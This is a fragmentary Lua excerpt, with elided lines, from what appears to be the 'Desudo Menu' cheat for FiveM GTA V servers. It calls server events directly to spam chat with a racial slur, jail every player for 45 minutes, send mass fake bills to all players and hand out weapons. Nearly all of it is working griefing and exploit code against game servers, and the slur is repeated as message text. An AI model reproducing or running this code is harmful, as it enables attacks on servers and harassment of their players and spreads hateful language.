                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Plane#0007 Desudo https://discord.gg/hkZgrv3',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Desudo; Plane#0007")
        end
    ...
    function()
        while true do
			...
			if chatspam then
                ...
                TriggerServerEvent('_chat:messageEntered', 'Plane#0007', {0, 0x99, 255}, 'nigga')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Desudo Babe <3 Plane#0007 https://discord.gg/hkZgrv3")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Desudo Babe <3 Plane#0007 https://discord.gg/hkZgrv3")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Desudo Menu")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Desudo ~s~Menu")
                drawNotification("~h~~s~Made by ~b~Plane#0007")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "nigga", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "nigga", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "nigga", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "nigga", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "nigga", "6969696969")
        ...
        drawNotification(
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~foriv#0001 - Owner") then
				elseif Plane.Button("∑~o~~h~Melon#1249 - Owner") then
				elseif Plane.Button("∑~y~~h~Plane#0007 - Developer") then
				elseif Plane.Button("∑~g~~h~Not Soviet Bear#6205 - Helping tons") then
				elseif Plane.Button("∑~b~~h~Notorius#5267 - Helping/testing tons") then
				elseif Plane.Button("∑~p~~h~Fallen#0811 - Developer") then
				elseif Plane.Button("∑~h~Maestro Menu - Inspiration") then
				end
				Plane.Display()
                elseif Plane.IsMenuOpened("PlayerOptionsMenu") then
                    ...
                    elseif Plane.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 25)
                        end
                    elseif Plane.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 25, false, false)
                        end
            ...
            elseif Plane.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Plane.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 25, false, true)
                    end
                end
            ...
            elseif Plane.IsMenuOpened("WeaponMenu") then
                ...
                elseif Plane.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 25, false, false)
                    end
                elseif Plane.Button("Remove All Weapons") then
                    for i = 1, #allWeapons do
                ...
                elseif Plane.Button("Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 25)
                    end
                elseif Plane.CheckBox(
                    "No Reload",
                    InfClip,
            ...
            elseif IsDisabledControlPressed(0, 163) then
                if logged then
                    ...
                    local temp = KeyboardInput("Enter Password", "XD", 100)
                    if temp == pass then
